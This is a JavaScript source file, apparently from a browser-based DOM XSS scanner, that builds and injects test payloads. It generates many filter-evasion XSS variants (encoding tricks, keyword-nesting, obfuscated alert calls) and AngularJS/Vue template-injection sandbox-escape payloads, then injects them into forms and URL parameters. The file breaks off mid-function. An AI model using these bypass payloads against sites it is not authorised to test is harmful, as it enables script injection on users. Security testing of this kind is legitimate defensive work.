/**
 * DOM XSS Hunter v4.6 — Fuzzer Helpers
 * Shared helper functions used by fuzzer-core, fuzzer-tools, and fuzzer-autofill.
 */
(function () {
  'use strict';
  const ns = window.__DOMXSS;
  const { generateCanary } = ns.utils;
  const { findReflections } = ns.probe;
  const { analyzeFlows } = ns.flows;
  const CONFIG = ns.CONFIG;
  const PROBE_CHARS = ns.PROBE_CHARS;
  const ENCODING_PATTERNS = ns.ENCODING_PATTERNS;
  const CONTEXT_PAYLOADS = ns.CONTEXT_PAYLOADS;
  const VERIFY_PAYLOADS = ns.VERIFY_PAYLOADS;

  function generateEncodingBypasses(payload, encodingMap) {
    const bypasses = [];

    // 1. Double encoding — produce single-encoded form (%3C etc.)
    //    so that searchParams.set() adds the second layer automatically.
    //    Server HTTP-decodes to %3C, app-level decode yields <
    const doubleEncoded = payload.replace(/[<>"'&;:()\\/{}=` ]/g, ch => {
      return '%' + ch.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase();
    });
    if (doubleEncoded !== payload) {
      bypasses.push({ payload: doubleEncoded, technique: 'Double URL encoding' });
    }

    // 2. Mixed case HTML entities
    const mixedCase = payload
      .replace(/</g, '&#x3C;').replace(/>/g, '&#x3E;')
      .replace(/"/g, '&#x22;').replace(/'/g, '&#x27;');
    if (mixedCase !== payload) {
      bypasses.push({ payload: mixedCase, technique: 'HTML entity encoding (mixed case hex)' });
    }

    // 3. Null byte injection (legacy)
    const nullByte = payload.replace(/</g, '%00<').replace(/>/g, '%00>');
    if (nullByte !== payload) {
      bypasses.push({ payload: nullByte, technique: 'Null byte injection (%00)' });
    }

    // 4. Unicode normalization bypasses
    const unicodeMap = { '<': '\uff1c', '>': '\uff1e', '"': '\uff02', "'": '\uff07', '/': '\uff0f' };
    let hasUnicode = false;
    let uniPayload = payload;
    for (const [ch, uni] of Object.entries(unicodeMap)) {
      if (payload.includes(ch)) { uniPayload = uniPayload.replaceAll(ch, uni); hasUnicode = true; }
    }
    if (hasUnicode) bypasses.push({ payload: uniPayload, technique: 'Unicode fullwidth chars' });

    // 5. JS Unicode escape
    const jsUni = payload
      .replace(/'/g, '\\u0027').replace(/"/g, '\\u0022')
      .replace(/</g, '\\u003c').replace(/>/g, '\\u003e');
    if (jsUni !== payload) {
      bypasses.push({ payload: jsUni, technique: 'JS Unicode escapes (\\u00xx)' });
    }

    // 6. Hex HTML entities con padding
    const hexPadded = payload
      .replace(/</g, '&#x0003C;').replace(/>/g, '&#x0003E;')
      .replace(/"/g, '&#x00022;');
    if (hexPadded !== payload) {
      bypasses.push({ payload: hexPadded, technique: 'Padded hex entities (bypass regex filters)' });
    }

    // 7. Tab/newline char breaking
    const tabBreak = payload
      .replace(/onerror/g, 'on\terror').replace(/onload/g, 'on\tload')
      .replace(/onfocus/g, 'on\tfocus').replace(/javascript/g, 'java\tscript');
    if (tabBreak !== payload) {
      bypasses.push({ payload: tabBreak, technique: 'Tab char insertion in event/protocol names' });
    }

    // 8. SVG/Math namespace confusion
    if (payload.includes('<img')) {
      bypasses.push({
        payload: payload.replace(/<img/g, '<svg/onload'),
        technique: 'img\u2192svg substitution',
      });
    }
    if (payload.includes('<svg') || payload.includes('<img')) {
      bypasses.push({
        payload: `<math><mtext>${payload}</mtext></math>`,
        technique: 'Math namespace confusion',
      });
    }

    // 9. Octal JS encoding for JS string contexts
    const octalEncoded = payload.replace(/[a-zA-Z]/g, ch => {
      return '\\' + ch.charCodeAt(0).toString(8);
    });
    if (octalEncoded !== payload) {
      bypasses.push({ payload: octalEncoded, technique: 'Octal JS string encoding (\\141\\154\\145\\162\\164)' });
    }

    // 10. Hex JS string encoding (\x61 form)
    const hexJsEncoded = payload.replace(/[a-zA-Z]/g, ch => {
      return '\\x' + ch.charCodeAt(0).toString(16).padStart(2, '0');
    });
    if (hexJsEncoded !== payload) {
      bypasses.push({ payload: hexJsEncoded, technique: 'Hex JS string encoding (\\x61\\x6c\\x65\\x72\\x74)' });
    }

    // 11. HTML entities without semicolons (parsers that require ; will miss these)
    const noSemiEntities = payload
      .replace(/</g, '&#60').replace(/>/g, '&#62')
      .replace(/"/g, '&#34').replace(/'/g, '&#39');
    if (noSemiEntities !== payload) {
      bypasses.push({ payload: noSemiEntities, technique: 'HTML entities without semicolons (&#60 not &#60;)' });
    }

    // 12. HTML entities with excessive zero-padding (bypass regex filters)
    const zeroPadded = payload
      .replace(/</g, '&#x000003c;').replace(/>/g, '&#x000003e;')
      .replace(/"/g, '&#x0000022;').replace(/'/g, '&#x0000027;');
    if (zeroPadded !== payload) {
      bypasses.push({ payload: zeroPadded, technique: 'HTML entities with excessive zero-padding (&#x0000022;)' });
    }

    // 13. Base64 data URI wrapping (for href/src contexts)
    if (payload.includes('alert') || payload.includes('onerror') || payload.includes('onload')) {
      const b64 = btoa(`<script>${payload.replace(/<[^>]*>/g, '')}</script>`);
      bypasses.push({
        payload: `data:text/html;base64,${b64}`,
        technique: 'Base64 data URI wrapping',
      });
    }

    // 14. Template literal + Unicode encoding
    if (payload.includes('alert')) {
      const templateUni = payload.replace(/alert/g, "${'\\u0061lert'}");
      if (templateUni !== payload) {
        bypasses.push({ payload: '`' + templateUni + '`', technique: 'Template literal + Unicode (${\\u0061lert})' });
      }
    }

    // 15. Two-stage HTML entity → JS Unicode decode chain
    // In event handler attrs, browser decodes HTML entities FIRST, then JS engine runs.
    // &#x5c; → \ (HTML decode), then \u0061 → a (JS decode), so &#x5c;u0061lert → alert
    if (payload.includes('alert')) {
      // Stage 1: HTML entity for backslash + JS unicode for 'a' in 'alert'
      const twoStage = payload.replace(/alert/g, '&#x5c;u0061lert');
      bypasses.push({ payload: twoStage, technique: 'Two-stage decode: HTML entity → JS Unicode (&#x5c;u0061lert → \\u0061lert → alert)' });

      // Variant: full JS unicode via HTML entities for each backslash
      const fullTwoStage = payload.replace(/alert/g, '&#x5c;u0061&#x5c;u006c&#x5c;u0065&#x5c;u0072&#x5c;u0074');
      bypasses.push({ payload: fullTwoStage, technique: 'Two-stage full: every char via HTML+JS decode chain' });
    }

    // 16. HTML decimal entities for key chars (without semicolons + with zero padding)
    // Different from #11/#12 — targets function names in event handler contexts
    if (payload.includes('onerror') || payload.includes('onload') || payload.includes('onfocus')) {
      const decimalEncoded = payload.replace(/[a-z]/g, ch => `&#${ch.charCodeAt(0)};`);
      bypasses.push({ payload: decimalEncoded, technique: 'Full decimal HTML entity encoding (event handler context)' });
    }

    // 17. Sacrificial prefix bypass (for first-occurrence-only sanitizers)
    // Prepend chars that will be consumed by string .replace(), letting the payload's chars survive
    const SACRIFICIAL_PREFIXES = ns.SACRIFICIAL_PREFIXES || {};
    for (const [ch, prefixes] of Object.entries(SACRIFICIAL_PREFIXES)) {
      if (!payload.includes(ch)) continue;
      for (const prefix of prefixes) {
        bypasses.push({
          payload: prefix + payload,
          technique: `Sacrificial prefix "${prefix}" — consumes first-occurrence-only replace("${ch}", ...)`,
          isSacrificialPrefix: true,
        });
      }
    }

    // 18. Keyword stripping bypass — nested insertion
    // If server does str.replace('script', ''), <scrscriptipt> → <script>
    const KEYWORD_BYPASS_PATTERNS = ns.KEYWORD_BYPASS_PATTERNS || {};
    for (const [keyword, variants] of Object.entries(KEYWORD_BYPASS_PATTERNS)) {
      if (!payload.toLowerCase().includes(keyword)) continue;
      for (const variant of variants) {
        const re = new RegExp(keyword, 'gi');
        const bypassed = payload.replace(re, variant);
        if (bypassed !== payload) {
          bypasses.push({
            payload: bypassed,
            technique: `Keyword bypass: "${keyword}" → "${variant}" (survives str.replace('${keyword}',''))`,
            isKeywordBypass: true,
            bypassedKeyword: keyword,
          });
        }
      }
    }

    // 19. Alternative JS function names (when alert/prompt/etc. are blocked)
    const JS_FUNC_ALTERNATIVES = ns.JS_FUNC_ALTERNATIVES || [];
    if (payload.includes('alert(1)') || payload.includes('alert`1`')) {
      for (const alt of JS_FUNC_ALTERNATIVES) {
        if (!alt.func || alt.func === 'alert') continue;
        const altPayload = payload
          .replace(/alert\(1\)/g, alt.call)
          .replace(/alert`1`/g, alt.call);
        if (altPayload !== payload) {
          bypasses.push({
            payload: altPayload,
            technique: `Alternative function: ${alt.desc}`,
            isAltFunction: true,
          });
        }
      }
    }

    // 20. Obfuscated function calls (for keyword-filtered alert)
    if (payload.includes('alert(')) {
      const obfuscated = [
        payload.replace(/alert\(1\)/g, "window['al'+'ert'](1)"),
        payload.replace(/alert\(1\)/g, "self['alert'](1)"),
        payload.replace(/alert\(1\)/g, "[].constructor.constructor('alert(1)')()"),
        payload.replace(/alert\(1\)/g, "eval(atob('YWxlcnQoMSk='))"),
        payload.replace(/alert\(1\)/g, "Function('alert(1)')()"),
        payload.replace(/alert\(1\)/g, "top['al'+'ert'](1)"),
      ];
      for (const op of obfuscated) {
        if (op !== payload) {
          bypasses.push({
            payload: op,
            technique: 'Obfuscated alert() call (keyword filter bypass)',
            isAltFunction: true,
          });
        }
      }
    }

    return bypasses;
  }

  /**
   * Reorder encoding bypasses based on detected encoding type.
   * Moves the most relevant bypass technique to the front instead of
   * always trying double-URL-encoding first (which is generic/brute-force).
   */
  function prioritizeBypasses(bypasses, encodingMap) {
    if (!encodingMap || bypasses.length <= 1) return bypasses;

    // Detect primary encoding types from the encoding map
    const encodings = Object.values(encodingMap).filter(v => typeof v === 'string');
    const hasHtmlEntity = encodings.some(e => /html|entity|&#|&lt|&gt|&quot/i.test(e));
    const hasUrlEncoding = encodings.some(e => /url.*encod|%[0-9A-Fa-f]{2}/i.test(e));
    const hasBackslash = encodings.some(e => /backslash|\\['"]/i.test(e));
    const hasKeywordStrip = encodings.some(e => /strip|keyword|removed/i.test(e));

    // Score each bypass: higher = try first
    function score(bp) {
      const t = (bp.technique || '').toLowerCase();
      // Keyword bypasses always high priority when stripping detected
      if (hasKeywordStrip && (bp.isKeywordBypass || t.includes('keyword'))) return 100;
      // Sacrificial prefix always high when partial encoding detected
      if (bp.isSacrificialPrefix || t.includes('sacrificial')) return 90;

      if (hasHtmlEntity) {
        if (t.includes('html entity') || t.includes('&#') || t.includes('hex entit') || t.includes('decimal') || t.includes('zero-pad')) return 80;
        if (t.includes('two-stage')) return 75;
      }
      if (hasUrlEncoding) {
        if (t.includes('double url') || t.includes('double encoding')) return 80;
        if (t.includes('unicode fullwidth')) return 70;
      }
      if (hasBackslash) {
        if (t.includes('js unicode') || t.includes('\\u00')) return 80;
        if (t.includes('hex js') || t.includes('\\x')) return 75;
        if (t.includes('octal')) return 70;
      }
      // Alternative function names are generic fallbacks
      if (bp.isAltFunction || t.includes('obfuscat') || t.includes('alternative')) return 30;
      // Everything else: default priority
      return 50;
    }

    return [...bypasses].sort((a, b) => score(b) - score(a));
  }

  /**
   * Resolve the user-facing "real" payload from a verification payload.
   * Replaces window.__xss_ID=1 with alert(1) or an alternative function
   * when 'alert' is stripped by the server.
   */
  function resolveRealPayload(p, analysis) {
    let realPL = p.realPayload
      || p.payload.replace(/void\(window\.__xss_\w+=1\)/g, 'alert(1)').replace(/window\.__xss_\w+=1/g, 'alert(1)');
    const strippedKWs = analysis?.strippedKeywords || [];
    if (strippedKWs.includes('alert') && realPL.includes('alert')) {
      const alts = ns.JS_FUNC_ALTERNATIVES || [];
      const alt = alts.find(a => a.func && a.func !== 'alert' && !strippedKWs.includes(a.func));
      if (alt) {
        realPL = realPL.replace(/alert\(1\)/g, alt.call).replace(/alert`1`/g, alt.call);
      } else {
        realPL = realPL.replace(/alert\(1\)/g, "window['al'+'ert'](1)");
      }
    }
    return realPL;
  }

  /**
   * Smart payload reflection check — handles server transformations.
   * Returns true if the payload's critical parts survived in the HTML.
   */
  function isPayloadReflected(payload, html) {
    // Exact match (best case)
    if (html.includes(payload)) return true;

    // For javascript: protocol payloads, check if javascript:... survived
    if (/^javascript:/i.test(payload)) {
      // Server might add spaces or vary case, check protocol + content
      return /javascript\s*:/i.test(html) && html.includes(payload.substring(11));
    }

    // For tag-based payloads, verify tag AND event handler appear IN THE SAME TAG
    // (not independently — <img> from site + onerror= from encoded text = false positive)
    const tagMatch = payload.match(/<(\w+)/);
    if (tagMatch) {
      const tag = tagMatch[1].toLowerCase();
      // Find all instances of this unencoded tag in the HTML
      const tagRe = new RegExp(`<${tag}(\\s[^>]*)?>`, 'gi');
      const eventMatch = payload.match(/\bon(\w+)\s*=/i);

      let m;
      while ((m = tagRe.exec(html)) !== null) {
        if (!eventMatch) return true; // Tag found, no event to verify
        // Check event handler exists WITHIN this specific tag
        const tagStr = m[0];
        const eventRe = new RegExp(`\\bon${eventMatch[1]}\\s*=`, 'i');
        if (eventRe.test(tagStr)) return true;
      }
      return false; // Tag not found unencoded, or event not in same tag
    }

    // Case-insensitive match (for non-tag payloads like javascript: without leading tag)
    if (html.toLowerCase().includes(payload.toLowerCase())) return true;

    return false;
  }

  /**
   * Generate a plausible filler value for a form field based on name/type.
   * Used when the original value is empty and the server requires non-empty fields.
   */
  function getFillerValue(input) {
    const name = (input.name || '').toLowerCase();
    const type = (input.type || 'text').toLowerCase();

    if (type === 'email' || name.includes('email') || name.includes('correo')) return 'test@test.com';
    if (type === 'url' || name === 'website' || name === 'url' || name === 'homepage' || name === 'site') return 'https://test.com';
    if (type === 'tel' || name.includes('phone') || name.includes('tel')) return '5551234567';
    if (type === 'number' || name.includes('age') || name.includes('quantity')) return '1';
    if (name.includes('name') || name === 'author' || name === 'user' || name === 'username') return 'testuser';
    if (name.includes('comment') || name.includes('message') || name.includes('body') || name.includes('text') || name.includes('content') || name.includes('description') || input.tagName === 'TEXTAREA') return 'test comment';
    if (name.includes('pass') || name.includes('pwd')) return 'TestPass123!';
    if (name.includes('subject') || name.includes('title')) return 'test';
    return 'test';
  }

  /**
   * Build a canary value that passes server-side validation for the field type.
   * URL fields get a URL-shaped canary, email fields get email-shaped, etc.
   * The canary.base is always embedded so it can be found in the response.
   */
  function getCanaryValue(canary, input) {
    const name = (input.name || '').toLowerCase();
    const type = (input.type || 'text').toLowerCase();
    if (type === 'url' || name === 'website' || name === 'url' || name === 'homepage' || name === 'site' || name === 'link') {
      return `https://${canary.base}.test.com`;
    }
    if (type === 'email' || name.includes('email') || name.includes('correo')) {
      return `${canary.base}@test.com`;
    }
    return canary.full;
  }

  function selectVerifyPayloads(context, survived, encodingMap) {
    const ctxPayloads = VERIFY_PAYLOADS[context];
    if (!ctxPayloads) return [];

    const verifyId = Math.random().toString(36).substring(2, 6);
    const viable = [];
    const bypassable = [];

    // Add CSTI verification payloads when AngularJS/Vue detected and {{ }} survive
    const fw = ns.state.frameworks;
    const hasCurly = survived.includes('{') && survived.includes('}');
    const hasParen = survived.includes('(') && survived.includes(')');
    const bodyOrAttr = context === 'html-body' || context.startsWith('html-attr') || context === 'angular-expression';

    if (hasCurly && hasParen && bodyOrAttr) {
      if (fw?.angular?.detected) {
        const ver = parseFloat(fw.angular.version) || 999;
        // Helper: encode JS expression as fromCharCode arguments
        const toCharCodes = (s) => [...s].map(c => c.charCodeAt(0)).join(',');

        const cstiPayloads = ver >= 1.6 ? [
          { desc: 'AngularJS CSTI — $on.constructor (v1.6+)',
            needs: ['{', '}', '(', ')', "'"],
            payload: (id) => `{{$on.constructor('window.__xss_${id}=1')()}}`,
            realPayload: "{{$on.constructor('alert(1)')()}}",
          },
          { desc: 'AngularJS CSTI — constructor chain',
            needs: ['{', '}', '(', ')', "'"],
            payload: (id) => `{{constructor.constructor('window.__xss_${id}=1')()}}`,
            realPayload: "{{constructor.constructor('alert(1)')()}}",
          },
          { desc: 'AngularJS sandbox escape — fromCharCode (no strings)',
            needs: ['{', '}', '(', ')', '.', '=', ';', '|'],
            payload: (id) => {
              const cc = toCharCodes(`constructor.constructor('window.__xss_${id}=1')()`);
              return `{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(${cc})}}`;
            },
            realPayload: '{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}',
          },
        ] : [
          { desc: 'AngularJS CSTI — sandbox escape (<=1.5)',
            needs: ['{', '}', '(', ')', "'", '.', '='],
            payload: (id) => `{{'a'.constructor.prototype.charAt=[].join;$eval('x=window.__xss_${id}=1')}}`,
            realPayload: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
          },
          { desc: 'AngularJS sandbox escape — fromCharCode (no strings, <=1.5)',
            needs: ['{', '}', '(', ')', '.', '=', ';', '|'],
            payload: (id) => {
              const cc = toCharCodes(`constructor.constructor('window.__xss_${id}=1')()`);
              return `{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(${cc})}}`;
            },
            realPayload: '{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}',
          },
        ];

        for (const p of cstiPayloads) {
          const met = p.needs.every(c => survived.includes(c));
          if (met) {
            viable.unshift({
              payload: p.payload(verifyId),
              check: (vid, win) => !!(win || window)[`__xss_${vid || verifyId}`],
              desc: p.desc,
              verifyId,
              viable: true,
              missing: [],
              realPayload: p.realPayload,
              isCSTI: true,
            });
          }
        }

      } else if (fw?.vue?.detected) {
        const vuePayloads = [
          { desc: 'Vue.js CSTI — constructor chain',
            needs: ['{', '}', '(', ')', "'"],
            payload: (id) => `{{this.constructor.constructor('window.__xss_${id}=1')()}}`,
            realPayload: "{{this.constructor.constructor('alert(1)')()}}",
          },
        ];
        for (const p of vuePayloads) {
          const met = p.needs.every(c => survived.includes(c));
          if (met) {
            viable.unshift({
              payload: p.payload(verifyId),
              check: (vid, win) => !!(win || window)[`__xss_${vid || verifyId}`],
              desc: p.desc,
              verifyId,
              viable: true,
              missing: [],
              realPayload: p.realPayload,
              isCSTI: true,
            });
          }
        }
      }
    }

    // Angular no-wrapper fallback: when { } don't survive but Angular is detected,
    // the page template may already have {{ }} around the reflection point.
    // Try fromCharCode payload WITHOUT {{ }} wrapper.
    if (!hasCurly && hasParen && bodyOrAttr && fw?.angular?.detected) {
      const toCC = (s) => [...s].map(c => c.charCodeAt(0)).join(',');
      const noWrapPayload = {
        desc: 'AngularJS sandbox escape — fromCharCode (template interpolation, no strings)',
        needs: ['(', ')', '.', '=', ';', '|'],
        payload: (id) => {
          const cc = toCC(`constructor.constructor('window.__xss_${id}=1')()`);
          return `toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(${cc})`;
        },
        realPayload: 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)',
      };
      const met = noWrapPayload.needs.every(c => survived.includes(c));
      if (met) {
        viable.push({
          payload: noWrapPayload.payload(verifyId),
          check: (vid, win) => !!(win || window)[`__xss_${vid || verifyId}`],
          desc: noWrapPayload.desc,
          verifyId,
          viable: true,
          missing: [],
          realPayload: noWrapPayload.realPayload,
          isCSTI: true,
        });
      }
    }

    // URL suffix injection: bypass value filtering by injecting as a URL param name.
    // No needs check — payload goes as param name, not through the filtered param value.
    // Only requires Angular detected + reflection in body/attr context.
    if (bodyOrAttr && fw?.angular?.detected) {
      const toCC = (s) => [...s].map(c => c.charCodeAt(0)).join(',');
      const urlSuffixCC = toCC(`constructor.constructor('window.__xss_${verifyId}=1')()`);
      viable.push({
        payload: `toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(${urlSuffixCC})`,
        check: (vid, win) => !!(win || window)[`__xss_${vid || verifyId}`],
        desc: 'AngularJS sandbox escape — fromCharCode URL suffix (no strings)',
        verifyId,
        viable: true,
        missing: [],
        realPayload: 'toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)',
        isCSTI: true,
        urlSuffix: true,
      });
    }

    for (const p of ctxPayloads) {
      const met = p.needs.every(c => survived.includes(c));
      const entry = {
        payload: p.payload(verifyId),
        check: () => p.check(verifyId),
        desc: p.desc,
        verifyId,
        viable: met,
        missing: met ? [] : p.needs.filter(c => !survived.includes(c)),
        bypass: p.bypass,
        realPayload: p.realPayload || null,
        needs: p.needs,
        ...(p.needsInteraction ? { needsInteraction: true } : {}),
      };

      if (met) {
        viable.push(entry);
      } else {
        const rawPayload = p.payload(verifyId);
        const encodingBypasses = generateEncodingBypasses(rawPayload, encodingMap);
        for (const eb of encodingBypasses) {
          bypassable.push({
            ...entry,
            payload: eb.payload,
            rawPayload,
            desc: `${p.desc} + ${eb.technique}`,
            bypass: eb.technique,
            viable: true,
            isEncodingBypass: true,
          });
        }
      }
    }

    // Fast-path: when no encoding, partial encoding, or keyword stripping detected,
    // skip all bypass generation — clean payloads are sufficient.
    const partialChars = (encodingMap?.__partiallyEncoded || []);
    const strippedKWs = encodingMap?.__strippedKeywords || [];

    if (partialChars.length === 0 && strippedKWs.length === 0 && bypassable.length === 0) {
      // CSP-aware prioritization still applies
      const cspInfo = encodingMap?.__cspInfo;
      if (cspInfo?.blocksInline) {
        const isScriptPayload = (p) => {
          const src = typeof p.payload === 'function' ? p.payload('_csp_') : p.payload;
          return /<script/i.test(src) || /data:text\/html/i.test(src);
        };
        viable.sort((a, b) => (isScriptPayload(a) ? 1 : 0) - (isScriptPayload(b) ? 1 : 0));
      }
      return viable;
    }

    // Sacrificial prefix bypass for partially-encoded chars
    // When analyzeReflection detects that a char survived raw BUT its encoded form
    // also appears (= first-occurrence-only sanitizer), auto-generate prefix-boosted payloads.
    const sacrificialPayloads = [];
    if (partialChars.length > 0) {
      const SACRIFICIAL_PREFIXES = ns.SACRIFICIAL_PREFIXES || {};
      for (const p of ctxPayloads) {
        const vId2 = Math.random().toString(36).substring(2, 6);
        const rawP = p.payload(vId2);
        const relevantPrefixes = partialChars
          .filter(ch => rawP.includes(ch))
          .flatMap(ch => (SACRIFICIAL_PREFIXES[ch] || []).map(pfx => ({ prefix: pfx, char: ch })));

        for (const { prefix, char } of relevantPrefixes) {
          sacrificialPayloads.push({
            payload: prefix + p.payload(verifyId),
            check: () => p.check(verifyId),
            desc: `${p.desc} + sacrificial prefix "${prefix}" (bypass first-occurrence replace("${char}"))`,
            verifyId,
            viable: true,
            missing: [],
            bypass: `Sacrificial prefix for partial encoding of "${char}"`,
            realPayload: p.realPayload ? prefix + p.realPayload : null,
            isSacrificialPrefix: true,
          });
        }
      }
    }

    // Keyword stripping bypass for payloads
    const recursiveKWs = encodingMap?.__recursivelyStripped || [];
    const kwBypassPayloads = [];
    if (strippedKWs.length > 0) {
      const KW_BYPASS_PATTERNS = ns.KEYWORD_BYPASS_PATTERNS || {};

      for (const p of ctxPayloads) {
        const rawP = p.payload(verifyId);
        // Check which stripped keywords appear in this payload
        const affectedKWs = strippedKWs.filter(kw => rawP.toLowerCase().includes(kw));
        if (affectedKWs.length === 0) continue;

        // For each affected keyword, try nested insertion bypass (first variant)
        // Skip nested insertion for recursively-stripped keywords (server strips in a loop)
        const nestableKWs = affectedKWs.filter(kw => !recursiveKWs.includes(kw));
        let bypassedPayload = rawP;
        let bypassDesc = [];
        for (const kw of nestableKWs) {
          const variants = KW_BYPASS_PATTERNS[kw];
          if (!variants || variants.length === 0) continue;
          const nested = variants[0];
          const re = new RegExp(kw, 'gi');
          bypassedPayload = bypassedPayload.replace(re, nested);
          bypassDesc.push(`"${kw}" → "${nested}"`);
        }

        if (bypassedPayload !== rawP) {
          kwBypassPayloads.push({
            payload: bypassedPayload,
            check: () => p.check(verifyId),
            desc: `${p.desc} + keyword bypass (${bypassDesc.join(', ')})`,
            verifyId,
            viable: true,
            missing: [],
            bypass: `Keyword stripping bypass: ${bypassDesc.join(', ')}`,
            realPayload: null,
            isKeywordBypass: true,
          });
        }

        // Also try case variation (second variant type)
        for (const kw of affectedKWs) {
          const variants = KW_BYPASS_PATTERNS[kw];
          if (!variants) continue;
          const caseVariant = variants.find(v => v.toUpperCase() === kw.toUpperCase() && v !== kw);
          if (!caseVariant) continue;
          const re = new RegExp(kw, 'g');
          let caseBypassed = rawP.replace(re, caseVariant);
          if (caseBypassed !== rawP) {
            kwBypassPayloads.push({
              payload: caseBypassed,
              check: () => p.check(verifyId),
              desc: `${p.desc} + case bypass ("${kw}" → "${caseVariant}")`,
              verifyId,
              viable: true,
              missing: [],
              bypass: `Case bypass: "${kw}" → "${caseVariant}"`,
              realPayload: null,
              isKeywordBypass: true,
            });
          }
        }
      }
    }

    // CSP-aware prioritization: when CSP blocks inline scripts,
    // deprioritize <script> payloads and prioritize event handlers
    const cspInfo = encodingMap?.__cspInfo;
    if (cspInfo?.blocksInline) {
      const isScriptPayload = (p) => {
        const src = typeof p.payload === 'function' ? p.payload('_csp_') : p.payload;
        return /<script/i.test(src) || /data:text\/html/i.test(src);
      };
      viable.sort((a, b) => (isScriptPayload(a) ? 1 : 0) - (isScriptPayload(b) ? 1 : 0));
      bypassable.sort((a, b) => (isScriptPayload(a) ? 1 : 0) - (isScriptPayload(b) ? 1 : 0));
    }

    // Split viable into "clean" (no partially-encoded needs) and "dirty" (uses partially-encoded chars).
    // Clean payloads (e.g. </script> breakout when < survived cleanly) are more reliable.
    const viableClean = viable.filter(e => !e.needs || !e.needs.some(c => partialChars.includes(c)));
    const viableDirty = viable.filter(e => e.needs && e.needs.some(c => partialChars.includes(c)));

    // Return order: clean viable > dirty viable (clean payload first) > sacrificial > keyword bypass > encoding bypass
    // Dirty payloads come BEFORE their sacrificial variants — the clean version may work
    // if partial encoding is inconsistent, and avoids wasting the payload budget on prefixes.
    return [...viableClean, ...viableDirty, ...sacrificialPayloads, ...kwBypassPayloads, ...bypassable];
  }

  function discoverParamsFromSource(existingKeys = new Set()) {
    const discovered = new Set();
    const paramPatterns = [
      /\.get\s*\(\s*['"]([^'"]+)['"]\s*\)/gi,
      /\.searchParams\s*\.\s*get\s*\(\s*['"]([^'"]+)['"]\s*\)/gi,
      /getParameter\s*\(\s*['"]([^'"]+)['"]\s*\)/gi,
      /params\s*\[\s*['"]([^'"]+)['"]\s*\]/gi,
      /['"]([^'"]{2,30})['"]\s*\]\s*(?:;|\.|,)/gi,
      /\.getAll\s*\(\s*['"]([^'"]+)['"]\s*\)/gi,
      /\.has\s*\(\s*['"]([^'"]+)['"]\s*\)/gi,
    ];

    const GENERIC = /^(length|type|name|value|text|data|key|id|class|style|src|href|action|toString|valueOf|constructor|prototype|__proto__|replace|split|join|map|filter|indexOf|charAt|push|pop|shift|content|method|charset|http-equiv)$/;

    const { findings } = ns.state;
    const codeBlobs = [];
    for (const s of findings.sources) {
      if (s.code) codeBlobs.push(s.code);
      if (s.context) codeBlobs.push(s.context);
    }
    for (const s of findings.sinks) {
      if (s.code) codeBlobs.push(s.code);
      if (s.context) codeBlobs.push(s.context);
    }
    document.querySelectorAll('script:not([src])').forEach(sc => {
      if (sc.textContent.length < 10000) codeBlobs.push(sc.textContent);
    });
    // Also scan external scripts that were pre-cached
    if (ns._extScriptCache) {
      for (const [, code] of ns._extScriptCache) {
        codeBlobs.push(code);
      }
    }

    for (const code of codeBlobs) {
      for (const pat of paramPatterns) {
        pat.lastIndex = 0;
        let m;
        while (m = pat.exec(code)) {
          const name = m[1];
          if (existingKeys.has(name)) continue;
          if (name.length < 2 || name.length > 50) continue;
          if (GENERIC.test(name)) continue;
          discovered.add(name);
        }
      }
    }
    return discovered;
  }

  async function injectAndWait(vector, value, delayMs = CONFIG.delays.injectWait, _extScriptCache = null) {
    switch (vector.type) {
      case 'input': {
        const el = vector.element;
        if (!el) break;
        if (el.contentEditable === 'true') {
          el.textContent = value;
        } else {
          const nativeSetter = Object.getOwnPropertyDescriptor(
            Object.getPrototypeOf(el), 'value'
          )?.set || Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
          if (nativeSetter) {
            nativeSetter.call(el, value);
          } else {
            el.value = value;
          }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
          el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));
        }
        if (vector.autoSubmit && el.form) {
          el.form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
        }
        break;
      }
      case 'url-param': {
        const url = new URL(location.href);
        url.searchParams.set(vector.param, value);
        history.replaceState(null, '', url.toString());
        window.dispatchEvent(new PopStateEvent('popstate'));
        // Clear any previous document.write capture content
        const prevCapture = document.getElementById('__domxss_docwrite_capture');
        if (prevCapture) prevCapture.innerHTML = '';
        let scriptsMatched = 0;
        let scriptsWithDocWrite = 0;
        let docWriteCalls = 0;

        // Helper: prepare mock container for document.write capture
        function _getMockContainer() {
          let mc = document.getElementById('__domxss_docwrite_capture');
          if (!mc) {
            mc = document.createElement('div');
            mc.id = '__domxss_docwrite_capture';
            mc.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none';
            document.body.appendChild(mc);
          }
          return mc;
        }

        // Helper: unwrap DOMContentLoaded/load wrappers
        function _unwrapCode(code) {
          let u = code;
          u = u.replace(/document\.addEventListener\s*\(\s*['"]DOMContentLoaded['"]\s*,\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
          u = u.replace(/window\.addEventListener\s*\(\s*['"]load['"]\s*,\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
          u = u.replace(/window\.onload\s*=\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
          u = u.replace(/\$\s*\(\s*(?:document\s*\)\s*\.\s*ready\s*\(|)\s*function\s*\([^)]*\)\s*\{/gi, '(function(){');
          return u;
        }

        // Helper: eval code with document.write mocked if needed
        function _evalWithMock(code, label) {
          const hasDocWrite = /\bdocument\.write(?:ln)?\s*\(/.test(code);
          const origW = hasDocWrite ? document.write : null;
